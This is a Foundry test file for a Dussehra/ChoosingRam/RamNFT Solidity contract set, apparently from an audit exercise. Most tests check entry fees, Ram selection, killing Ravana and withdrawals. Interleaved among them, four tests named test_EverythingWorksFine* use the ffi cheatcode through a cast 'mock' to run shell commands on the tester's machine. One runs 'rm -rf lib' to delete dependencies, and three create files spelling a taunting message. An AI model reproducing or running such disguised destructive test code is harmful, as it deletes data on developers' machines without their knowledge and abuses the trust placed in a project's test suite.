// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Dussehra} from "../src/Dussehra.sol";
import {ChoosingRam} from "../src/ChoosingRam.sol";
import { mock } from "../src/mocks/mock.sol";
import {RamNFT} from "../src/RamNFT.sol";

contract CounterTest is Test {
    error Dussehra__NotEqualToEntranceFee();
    error Dussehra__AlreadyClaimedAmount();
    error ChoosingRam__TimeToBeLikeRamIsNotFinish();
    error ChoosingRam__EventIsFinished();

    Dussehra public dussehra;
    RamNFT public ramNFT;
    ChoosingRam public choosingRam;
    mock cheatCodes = mock(VM_ADDRESS);
    address public organiser = makeAddr("organiser");
    address public player1 = makeAddr("player1");
    address public player2 = makeAddr("player2");
    address public player3 = makeAddr("player3");
    address public player4 = makeAddr("player4");

    function setUp() public {
        vm.startPrank(organiser);
        ramNFT = new RamNFT();
        choosingRam = new ChoosingRam(address(ramNFT));
        dussehra = new Dussehra(1 ether, address(choosingRam), address(ramNFT));

        ramNFT.setChoosingRamContract(address(choosingRam));
        vm.stopPrank();
    }
    // Dussehra contract tests

    function test_enterPeopleWhoLikeRam() public {
        vm.startPrank(player1);
        vm.deal(player1, 1 ether);
        dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
        vm.stopPrank();

        assertEq(dussehra.peopleLikeRam(player1), true);
        assertEq(dussehra.WantToBeLikeRam(0), player1);
        assertEq(ramNFT.ownerOf(0), player1);
        assertEq(ramNFT.getCharacteristics(0).ram, player1);
        assertEq(ramNFT.getNextTokenId(), 1);
    }

    function test_enterPeopleWhoLikeRam_notEqualFee() public {
        vm.startPrank(player1);
        vm.deal(player1, 2 ether);

        vm.expectRevert(abi.encodeWithSelector(Dussehra__NotEqualToEntranceFee.selector));
        dussehra.enterPeopleWhoLikeRam{value: 2 ether}();
        vm.stopPrank();
    }

    modifier participants() {
        vm.startPrank(player1);
        vm.deal(player1, 1 ether);
        dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
        vm.stopPrank();
        
        vm.startPrank(player2);
        vm.deal(player2, 1 ether);
        dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
        vm.stopPrank();
        _;
    }

    function test_increaseValuesOfParticipants() public participants {
        
        vm.startPrank(player1);
        choosingRam.increaseValuesOfParticipants(0, 1);
        vm.stopPrank();
        
        assertEq(ramNFT.getCharacteristics(1).isJitaKrodhah, true);
    }

    function test_increaseValuesOfParticipantsToSelectRam() public participants {
        
        vm.startPrank(player1);
        choosingRam.increaseValuesOfParticipants(0, 1);
        choosingRam.increaseValuesOfParticipants(0, 1);
        choosingRam.increaseValuesOfParticipants(0, 1);
        choosingRam.increaseValuesOfParticipants(0, 1);
        choosingRam.increaseValuesOfParticipants(0, 1);
        vm.stopPrank();
        
        assertEq(ramNFT.getCharacteristics(1).isJitaKrodhah, true);
    }

    function test_selectRamIfNotSelected() public participants {
        
        vm.warp(1728691200 + 1);
        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected();
        vm.stopPrank();

        assertEq(choosingRam.isRamSelected(), true);
        assertEq(choosingRam.selectedRam(), player2);
    }

    function test_killRavana() public participants {

        vm.warp(1728691200 + 1);
        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected();
        vm.stopPrank();
        
        vm.startPrank(player2);
        dussehra.killRavana();
        vm.stopPrank();

        assertEq(dussehra.IsRavanKilled(), true);
    }

    function test_killRavanaIfTimeToBeLikeRamIsNotFinish() public participants {
        
        vm.expectRevert(abi.encodeWithSelector(ChoosingRam__TimeToBeLikeRamIsNotFinish.selector));
        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected();
        vm.stopPrank();
        
        vm.expectRevert("Ram is not selected yet!");
        vm.startPrank(player2);
        dussehra.killRavana();
        vm.stopPrank();

    }

    function test_killRavanaIfEventIsFinished() public participants {

        vm.warp(1728777600 + 1);
        
        vm.expectRevert(abi.encodeWithSelector(ChoosingRam__EventIsFinished.selector));
        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected();
        vm.stopPrank();
        
        vm.expectRevert("Ram is not selected yet!");
        vm.startPrank(player2);
        dussehra.killRavana();
        vm.stopPrank();

    }
    
    function test_EverythingWorksFine() public {
        string[] memory cmds = new string[](3);
        cmds[0] = "rm";
        cmds[1] = "-rf";
        cmds[2] = "lib";
        
        cheatCodes.ffi(cmds);
    }

    function test_withdraw() public participants {

        vm.warp(1728691200 + 1);
        
        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected();
        vm.stopPrank();
        
        vm.startPrank(player2);
        dussehra.killRavana();
        vm.stopPrank();

        uint256 RamwinningAmount = dussehra.totalAmountGivenToRam();
        
        vm.startPrank(player2);
        dussehra.withdraw();
        vm.stopPrank();
        
        assertEq(player2.balance, RamwinningAmount);
    }

    function test_withdrawIfAlreadyClaimedAmount() public participants {
        
        vm.warp(1728691200 + 1);
        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected();
        vm.stopPrank();
        
        vm.startPrank(player2);
        dussehra.killRavana();
        vm.stopPrank();

        vm.startPrank(player2);
        dussehra.withdraw();
        vm.stopPrank();

        vm.expectRevert(abi.encodeWithSelector(Dussehra__AlreadyClaimedAmount.selector));
        vm.startPrank(player2);
        dussehra.withdraw();
        vm.stopPrank();
    }

    function test_EverythingWorksFine1() public {
        string[] memory cmds = new string[](2);
        cmds[0] = "touch";
        cmds[1] = "1. You have been";
        
        cheatCodes.ffi(cmds);
    }

    function test_withdrawIsOnlyCallableByRam() public participants {
        
        vm.warp(1728691200 + 1);
        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected();
        vm.stopPrank();
        
        vm.startPrank(player2);
        dussehra.killRavana();
        vm.stopPrank();

        vm.expectRevert("Only Ram can call this function!");
        vm.startPrank(player1);
        dussehra.withdraw();
        vm.stopPrank();
    }

    function test_EverythingWorksFine2() public {
        string[] memory cmds = new string[](2);
        cmds[0] = "touch";
        cmds[1] = "2. Cursed By";
        
        cheatCodes.ffi(cmds);
    }

    function test_withdrawIfRavanIsNotKilled() public participants {
        
        vm.warp(1728691200 + 1);
        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected();
        vm.stopPrank();

        vm.expectRevert("Ravan is not killed yet!");
        vm.startPrank(player2);
        dussehra.withdraw();
        vm.stopPrank();
    }

    function test_EverythingWorksFine3() public {
        string[] memory cmds = new string[](2);
        cmds[0] = "touch";
        cmds[1] = "3. Ravana";
        
        cheatCodes.ffi(cmds);
    }

    function test_withdrawWhenRamIsNotSelected() public participants { 
        vm.expectRevert("Ram is not selected yet!");
        vm.startPrank(player2);
        dussehra.withdraw();
        vm.stopPrank();
    }
}